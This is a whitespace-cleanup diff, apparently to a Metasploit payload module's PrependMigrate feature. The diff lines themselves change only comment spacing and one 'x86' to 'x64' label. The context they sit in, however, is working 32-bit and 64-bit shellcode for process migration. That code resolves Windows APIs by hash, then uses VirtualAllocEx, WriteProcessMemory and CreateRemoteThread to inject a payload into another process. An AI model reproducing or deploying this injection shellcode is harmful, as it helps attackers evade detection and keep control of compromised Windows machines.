@@ -116,7 +116,7 @@ not_lowercase:              ;
   jz get_next_mod1          ; If no EAT present, process the next module
   add eax, edx              ; Add the modules base address
   push eax                  ; Save the current modules EAT
-  mov ecx, [eax+24]         ; Get the number of function names  
+  mov ecx, [eax+24]         ; Get the number of function names
   mov ebx, [eax+32]         ; Get the rva of the function names
   add ebx, edx              ; Add the modules base address
   ; Computing the module hash + function hash
@@ -135,14 +135,14 @@ loop_funcname:              ;
   cmp al, ah                ; Compare AL (the next byte from the name) to AH (null)
   jne loop_funcname         ; If we have not reached the null terminator, continue
   add edi, [ebp-8]          ; Add the current module hash to the function hash
-  cmp edi, [ebp+36]         ; Compare the hash to the one we are searchnig for 
+  cmp edi, [ebp+36]         ; Compare the hash to the one we are searchnig for
   jnz get_next_func         ; Go compute the next function hash if we have not found it
   ; If found, fix up stack, call the function and then value else compute the next one...
   pop eax                   ; Restore the current modules EAT
-  mov ebx, [eax+36]         ; Get the ordinal table rva      
+  mov ebx, [eax+36]         ; Get the ordinal table rva
   add ebx, edx              ; Add the modules base address
   mov cx, [ebx+2*ecx]       ; Get the desired functions ordinal
-  mov ebx, [eax+28]         ; Get the function addresses table rva  
+  mov ebx, [eax+28]         ; Get the function addresses table rva
   add ebx, edx              ; Add the modules base address
   mov eax, [ebx+4*ecx]      ; Get the desired functions RVA
   add eax, edx              ; Add the modules base address to get the functions actual VA
@@ -246,15 +246,15 @@ start:
 
   ; eax now contains the destination
   ; WriteProcessMemory()
-  push esp                  ; lpNumberOfBytesWritten 
-  push #{payloadsize}       ; nSize 
+  push esp                  ; lpNumberOfBytesWritten
+  push #{payloadsize}       ; nSize
   ; pick up pointer to shellcode & keep it on stack
   jmp begin_of_payload
-  begin_of_payload_return:  ; lpBuffer 
-  push eax                  ; lpBaseAddress 
-  push [edi]                ; hProcess 
+  begin_of_payload_return:  ; lpBuffer
+  push eax                  ; lpBaseAddress
+  push [edi]                ; hProcess
   push 0xE7BDD8C5           ; hash( "kernel32.dll", "WriteProcessMemory" )
-  call ebp                  ; WriteProcessMemory( ...);
+  call ebp                  ; WriteProcessMemory( ...)
 
   ; run the code (CreateRemoteThread())
   push ebx                  ; lpthreadID
@@ -264,7 +264,7 @@ start:
   push ecx                  ; shellcode
   push ebx                  ; stacksize
   push ebx                  ; lpThreadAttributes
-  push [edi] 
+  push [edi]
   push 0x799AACC6           ; hash( "kernel32.dll", "CreateRemoteThread" )
   call ebp                  ; CreateRemoteThread( ...);
 
@@ -284,7 +284,7 @@ EOS
 
 				pre << Metasm::Shellcode.assemble(Metasm::Ia32.new, migrate_asm).encode_string
 			end
-		# Handle all x86 code here
+		# Handle all x64 code here
 		elsif test_arch.include?(ARCH_X86_64) or test_arch.include?(ARCH_X64)
 			# PrependMigrate
 			if datastore['PrependMigrate'] and datastore['PrependMigrate'].to_s.downcase == 'true'
@@ -308,7 +308,7 @@ api_call:
   mov rdx, [rdx+32]        ; Get the first module from the InMemoryOrder module list
 next_mod:                  ;
   mov rsi, [rdx+80]        ; Get pointer to modules name (unicode string)
-  movzx rcx, word [rdx+74] ; Set rcx to the length we want to check 
+  movzx rcx, word [rdx+74] ; Set rcx to the length we want to check
   xor r9, r9               ; Clear r9 which will store the hash of the module name
 loop_modname:              ;
   xor rax, rax             ; Clear rax
@@ -323,7 +323,7 @@ not_lowercase:             ;
   ; We now have the module hash computed
   push rdx                 ; Save the current position in the module list for later
   push r9                  ; Save the current module hash for later
-  ; Proceed to itterate the export address table, 
+  ; Proceed to itterate the export address table
   mov rdx, [rdx+32]        ; Get this modules base address
   mov eax, dword [rdx+60]  ; Get PE header
   add rax, rdx             ; Add the modules base address
@@ -332,7 +332,7 @@ not_lowercase:             ;
   jz get_next_mod1         ; If no EAT present, process the next module
   add rax, rdx             ; Add the modules base address
   push rax                 ; Save the current modules EAT
-  mov ecx, dword [rax+24]  ; Get the number of function names  
+  mov ecx, dword [rax+24]  ; Get the number of function names
   mov r8d, dword [rax+32]  ; Get the rva of the function names
   add r8, rdx              ; Add the modules base address
   ; Computing the module hash + function hash
@@ -351,14 +351,14 @@ loop_funcname:             ;
   cmp al, ah               ; Compare AL (the next byte from the name) to AH (null)
   jne loop_funcname        ; If we have not reached the null terminator, continue
   add r9, [rsp+8]          ; Add the current module hash to the function hash
-  cmp r9d, r10d            ; Compare the hash to the one we are searchnig for 
+  cmp r9d, r10d            ; Compare the hash to the one we are searchnig for
   jnz get_next_func        ; Go compute the next function hash if we have not found it
   ; If found, fix up stack, call the function and then value else compute the next one...
   pop rax                  ; Restore the current modules EAT
-  mov r8d, dword [rax+36]  ; Get the ordinal table rva      
+  mov r8d, dword [rax+36]  ; Get the ordinal table rva
   add r8, rdx              ; Add the modules base address
   mov cx, [r8+2*rcx]       ; Get the desired functions ordinal
-  mov r8d, dword [rax+28]  ; Get the function addresses table rva  
+  mov r8d, dword [rax+28]  ; Get the function addresses table rva
   add r8, rdx              ; Add the modules base address
   mov eax, dword [r8+4*rcx]; Get the desired functions RVA
   add rax, rdx             ; Add the modules base address to get the functions actual VA
@@ -462,16 +462,16 @@ start:
   call rbp                  ; VirtualAllocEx( ...);
 
   ; eax now contains the destination - save in ebx
-  mov rbx, rax              ; lpBaseAddress 
+  mov rbx, rax              ; lpBaseAddress
   ; WriteProcessMemory()
-  push rsp                  ; lpNumberOfBytesWritten 
-  mov r9, #{payloadsize}    ; nSize 
+  push rsp                  ; lpNumberOfBytesWritten
+  mov r9, #{payloadsize}    ; nSize
   ; pick up pointer to shellcode & keep it on stack
   jmp begin_of_payload
   begin_of_payload_return:
   pop r8                    ; lpBuffer
-  mov rdx, rax              ; lpBaseAddress 
-  mov rcx, [rdi]            ; hProcess 
+  mov rdx, rax              ; lpBaseAddress
+  mov rcx, [rdi]            ; hProcess
   mov r10d, 0xE7BDD8C5      ; hash( "kernel32.dll", "WriteProcessMemory" )
   call rbp                  ; WriteProcessMemory( ...);
 
@@ -483,7 +483,7 @@ start:
   mov r9,rbx                ; shellcode
   mov r8, rcx               ; stacksize
   ;rdx already equals 0     ; lpThreadAttributes
-  mov rcx, [rdi] 
+  mov rcx, [rdi]
   mov r10d, 0x799AACC6      ; hash( "kernel32.dll", "CreateRemoteThread" )
   call rbp                  ; CreateRemoteThread( ...);
 
